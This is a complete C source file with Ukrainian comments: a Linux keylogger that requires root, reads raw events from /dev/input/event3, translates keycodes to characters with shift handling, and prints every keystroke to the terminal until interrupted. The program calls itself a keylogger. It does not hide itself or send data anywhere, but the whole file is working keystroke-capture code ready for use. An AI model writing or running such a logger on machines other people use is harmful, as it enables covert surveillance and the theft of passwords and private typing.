#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <signal.h>
#include <time.h>

volatile sig_atomic_t keep_running = 1;

// Обробник сигналу Ctrl+C
void signal_handler(int signal) {
    keep_running = 0;
    printf("\nЗавершення роботи...\n");
}

// Перетворення коду клавіші у символ
const char* keycode_to_char(int keycode, int shift_pressed) {
    switch (keycode) {
        case KEY_Q: return shift_pressed ? "Q" : "q";
        case KEY_W: return shift_pressed ? "W" : "w";
        case KEY_E: return shift_pressed ? "E" : "e";
        case KEY_R: return shift_pressed ? "R" : "r";
        case KEY_T: return shift_pressed ? "T" : "t";
        case KEY_Y: return shift_pressed ? "Y" : "y";
        case KEY_U: return shift_pressed ? "U" : "u";
        case KEY_I: return shift_pressed ? "I" : "i";
        case KEY_O: return shift_pressed ? "O" : "o";
        case KEY_P: return shift_pressed ? "P" : "p";
        case KEY_A: return shift_pressed ? "A" : "a";
        case KEY_S: return shift_pressed ? "S" : "s";
        case KEY_D: return shift_pressed ? "D" : "d";
        case KEY_F: return shift_pressed ? "F" : "f";
        case KEY_G: return shift_pressed ? "G" : "g";
        case KEY_H: return shift_pressed ? "H" : "h";
        case KEY_J: return shift_pressed ? "J" : "j";
        case KEY_K: return shift_pressed ? "K" : "k";
        case KEY_L: return shift_pressed ? "L" : "l";
        case KEY_Z: return shift_pressed ? "Z" : "z";
        case KEY_X: return shift_pressed ? "X" : "x";
        case KEY_C: return shift_pressed ? "C" : "c";
        case KEY_V: return shift_pressed ? "V" : "v";
        case KEY_B: return shift_pressed ? "B" : "b";
        case KEY_N: return shift_pressed ? "N" : "n";
        case KEY_M: return shift_pressed ? "M" : "m";
        case KEY_1: return shift_pressed ? "!" : "1";
        case KEY_2: return shift_pressed ? "@" : "2";
        case KEY_3: return shift_pressed ? "#" : "3";
        case KEY_4: return shift_pressed ? "$" : "4";
        case KEY_5: return shift_pressed ? "%" : "5";
        case KEY_6: return shift_pressed ? "^" : "6";
        case KEY_7: return shift_pressed ? "&" : "7";
        case KEY_8: return shift_pressed ? "*" : "8";
        case KEY_9: return shift_pressed ? "(" : "9";
        case KEY_0: return shift_pressed ? ")" : "0";
        case KEY_SPACE: return " ";
        case KEY_ENTER: return "[ENTER]\n";
        case KEY_TAB: return "[TAB]\t";
        case KEY_BACKSPACE: return "[BACKSPACE]";
        case KEY_MINUS: return shift_pressed ? "_" : "-";
        case KEY_EQUAL: return shift_pressed ? "+" : "=";
        case KEY_COMMA: return shift_pressed ? "<" : ",";
        case KEY_DOT: return shift_pressed ? ">" : ".";
        case KEY_SLASH: return shift_pressed ? "?" : "/";
        case KEY_SEMICOLON: return shift_pressed ? ":" : ";";
        case KEY_APOSTROPHE: return shift_pressed ? "\"" : "'";
        default: return NULL;
    }
}

int main() {
    // Вкажи свій пристрій тут:
    const char* device_path = "/dev/input/event3";

    if (geteuid() != 0) {
        printf("Цей кейлогер потребує root-доступу. Використай sudo.\n");
        return 1;
    }

    signal(SIGINT, signal_handler);

    printf("Відкриваємо пристрій: %s\n", device_path);
    int fd = open(device_path, O_RDONLY);
    if (fd == -1) {
        perror("Не вдалося відкрити пристрій");
        return 1;
    }

    time_t now = time(NULL);
    char time_buffer[64];
    strftime(time_buffer, sizeof(time_buffer), "%Y-%m-%d %H:%M:%S", localtime(&now));
    printf("--- Початок логування: %s ---\n", time_buffer);

    struct input_event ev;
    int shift_pressed = 0;

    while (keep_running) {
        if (read(fd, &ev, sizeof(ev)) == sizeof(ev)) {
            if (ev.type == EV_KEY) {
                if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
                    shift_pressed = (ev.value != 0);
                } else if (ev.value == 1) { // натискання
                    const char* ch = keycode_to_char(ev.code, shift_pressed);
                    if (ch) {
                        printf("%s", ch);
                        fflush(stdout);
                    }
                }
            }
        }
    }

    close(fd);
    printf("\n--- Кінець логування ---\n");
    return 0;
}
